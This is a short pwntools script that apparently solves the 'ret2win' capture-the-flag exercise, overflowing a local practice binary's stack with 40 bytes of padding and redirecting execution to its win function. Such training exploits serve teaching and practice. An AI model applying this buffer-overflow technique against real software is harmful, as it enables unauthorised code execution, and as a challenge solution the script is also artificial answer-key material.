from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF('./ret2win', checksec=False)
p = process(exe.path)

offset = 40
payload = b'A' * offset + p64(exe.sym.ret2win + 1)

p.sendlineafter(b'> ', payload)
p.interactive()
